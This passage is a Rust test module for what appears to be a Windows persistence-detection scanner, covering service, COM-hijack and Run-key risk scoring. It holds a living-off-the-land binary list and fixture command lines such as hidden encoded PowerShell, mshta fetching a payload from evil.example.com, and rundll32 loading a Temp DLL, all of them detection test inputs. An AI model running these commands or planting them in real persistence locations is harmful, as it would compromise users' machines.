        let scored = score_service(&record, true, SignatureStatus::Unknown, None);
        assert!(scored.score >= 30);
        assert!(scored
            .reasons
            .iter()
            .any(|r| r.contains("missing from disk")));
    }

    #[test]
    fn invalid_signature_forces_high_risk_service() {
        // Non-trusted image: +40 invalid with no trusted discount.
        let mut record = crate::fixtures::review_service_record();
        record.image_path = r"C:\cure-synth\svc\CURE-SYNTH-agent.exe --service".to_string();
        let scored = score_service(&record, false, SignatureStatus::Invalid, None);
        assert_eq!(scored.risk, RiskLevel::HighRisk);
    }

    #[test]
    fn known_hash_forces_high_risk_service() {
        let record = crate::fixtures::safe_service_record();
        let scored = score_service(
            &record,
            false,
            SignatureStatus::ValidSigned,
            Some("synthetic fixture"),
        );
        assert_eq!(scored.risk, RiskLevel::HighRisk);
        assert!(scored
            .reasons
            .iter()
            .any(|r| r.contains("Known Malware Hash")));
    }

    #[test]
    fn hash_lookup_bounded_to_untrusted_images() {
        let dir = tempfile::tempdir().unwrap();
        let exe = dir.path().join("svc.exe");
        std::fs::write(&exe, b"MZ").unwrap();
        assert!(!service_needs_hash(
            r"C:\Windows\System32\svc.exe",
            Some(&exe)
        ));
        assert!(service_needs_hash(
            r"C:\cure-synth\Temp\svc.exe",
            Some(&exe)
        ));
        assert!(!service_needs_hash(r"C:\cure-synth\Temp\svc.exe", None));
    }

    #[test]
    fn com_guid_names_do_not_earn_random_points() {
        let entry = PersistenceEntry::new(
            PersistenceSource::ComHijack,
            "{0003000A-0000-0000-C000-000000000046} InprocServer32",
            r"C:\Windows\System32\ole32.dll",
            r"HKCU\Software\Classes\CLSID\{0003000A-0000-0000-C000-000000000046}\InprocServer32",
        );
        let scored = score_with_signals(&entry, SignatureStatus::Unknown, None);
        assert!(
            !scored
                .reasons
                .iter()
                .any(|r| r.contains("randomly generated")),
            "CLSID names must not earn random-name points: {scored:?}"
        );
    }

    #[test]
    fn treat_as_targets_are_evidence_not_programs() {
        assert!(is_bare_guid("{D3E34B21-9D75-101A-8C3D-00AA001A1652}"));
        assert!(!is_bare_guid(r"C:\Windows\System32\ole32.dll"));
        assert!(!is_bare_guid(""));
        let entry = PersistenceEntry::new(
            PersistenceSource::ComHijack,
            "{0003000A-0000-0000-C000-000000000046} TreatAs",
            "{D3E34B21-9D75-101A-8C3D-00AA001A1652}",
            r"HKCU\Software\Classes\CLSID\{0003000A-0000-0000-C000-000000000046}\TreatAs",
        );
        let scored = score_with_signals(&entry, SignatureStatus::Unknown, None);
        assert_eq!(scored.risk, RiskLevel::Safe);
        assert!(scored.reasons.iter().any(|r| r.contains("TreatAs")));
    }

    #[test]
    fn attack_info_covers_every_source() {
        use crate::model::PersistenceSource::*;
        for source in [
            RegistryRun,
            StartupFolder,
            ScheduledTask,
            WindowsService,
            WmiSubscription,
            IfeoDebugger,
            AppInitDlls,
            ComHijack,
        ] {
            let info = attack_info_for(&source);
            assert!(!info.id.is_empty(), "missing ATT&CK id for {source:?}");
            assert!(!info.name.is_empty(), "missing ATT&CK name for {source:?}");
        }
    }

    // -----------------------------------------------------------------------
    // LOLBin scoring — signed Microsoft hosts with suspicious args currently
    // score Safe due to the -40 Valid discount. These tests document the
    // desired future behavior (no discount when LOLBin + heuristic fires)
    // and are intentionally ignored until the scoring change is approved.
    // -----------------------------------------------------------------------

    const LOLBINS: &[&str] = &[
        "powershell.exe",
        "pwsh.exe",
        "cmd.exe",
        "mshta.exe",
        "rundll32.exe",
        "wscript.exe",
        "cscript.exe",
        "msbuild.exe",
    ];

    fn is_lolbin(program: &str) -> bool {
        let lower = program.to_ascii_lowercase();
        LOLBINS.iter().any(|bin| lower.ends_with(bin))
    }

    #[test]
    #[ignore = "pending approval: LOLBin with heuristics should not get Valid discount"]
    fn lolbin_powershell_hidden_encoded_stays_flagged() {
        let entry = crate::model::PersistenceEntry::new(
            crate::model::PersistenceSource::RegistryRun,
            "test",
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -EncodedCommand aABlAGwAbABvAA==",
            "HKCU\\Run",
        );
        let scored = score_with_signals(&entry, SignatureStatus::ValidSigned, None);
        // Desired: no -40 when powershell + hidden/encoded triggers
        assert_ne!(scored.risk, RiskLevel::Safe, "LOLBin powershell with Hidden+Encoded must not be Safe even when signed; got {:?} score {} reasons {:?}", scored.risk, scored.score, scored.reasons);
        assert!(scored.score >= 15, "should remain at least Suspicious");
    }

    #[test]
    #[ignore = "pending approval: LOLBin with heuristics should not get Valid discount"]
    fn lolbin_cmd_with_temp_payload_stays_flagged() {
        let entry = crate::model::PersistenceEntry::new(
            crate::model::PersistenceSource::RegistryRun,
            "test",
            r"C:\Windows\System32\cmd.exe /c C:\Users\bob\AppData\Local\Temp\payload.exe",
            "HKCU\\Run",
        );
        let scored = score_with_signals(&entry, SignatureStatus::ValidSigned, None);
        assert_ne!(
            scored.risk,
            RiskLevel::Safe,
            "cmd with Temp payload must not be Safe even when signed; got {:?} {:?}",
            scored.risk,
            scored.reasons
        );
    }

    #[test]
    #[ignore = "pending approval: LOLBin with heuristics should not get Valid discount"]
    fn lolbin_mshta_with_http_stays_flagged() {
        // mshta with http is not currently a heuristic, so this test documents
        // that the minimal fix must either add a heuristic or explicitly list
        // mshta as LOLBin that never gets discount when URL present.
        let entry = crate::model::PersistenceEntry::new(
            crate::model::PersistenceSource::RegistryRun,
            "test",
            r"C:\Windows\System32\mshta.exe http://evil.example.com/payload.hta",
            "HKCU\\Run",
        );
        let scored = score_with_signals(&entry, SignatureStatus::ValidSigned, None);
        // Currently Safe (0) because no heuristic fires; desired after fix is investigation.
        // This test will fail until a mshta+http heuristic or blanket LOLBin rule is added.
        assert_ne!(
            scored.risk,
            RiskLevel::Safe,
            "mshta with http should not be Safe even when signed; got {:?} {:?}",
            scored.risk,
            scored.reasons
        );
    }

    #[test]
    #[ignore = "pending approval: LOLBin with heuristics should not get Valid discount"]
    fn lolbin_rundll32_with_temp_dll_stays_flagged() {
        let entry = crate::model::PersistenceEntry::new(
            crate::model::PersistenceSource::RegistryRun,
            "test",
            r"C:\Windows\System32\rundll32.exe C:\Users\bob\AppData\Local\Temp\evil.dll,Entry",
            "HKCU\\Run",
        );
        let scored = score_with_signals(&entry, SignatureStatus::ValidSigned, None);
        assert_ne!(
            scored.risk,
            RiskLevel::Safe,
            "rundll32 with Temp DLL must not be Safe even when signed; got {:?} {:?}",
            scored.risk,
            scored.reasons
        );
    }

    #[test]
    #[ignore = "pending approval: LOLBin discount helper is pure and case-insensitive"]
    fn lolbin_helper_is_pure() {
        assert!(is_lolbin("C:\\Windows\\System32\\powershell.exe"));
        assert!(is_lolbin("POWERSHELL.EXE"));
        assert!(is_lolbin("cmd.exe"));
        assert!(!is_lolbin("notepad.exe"));
    }
}
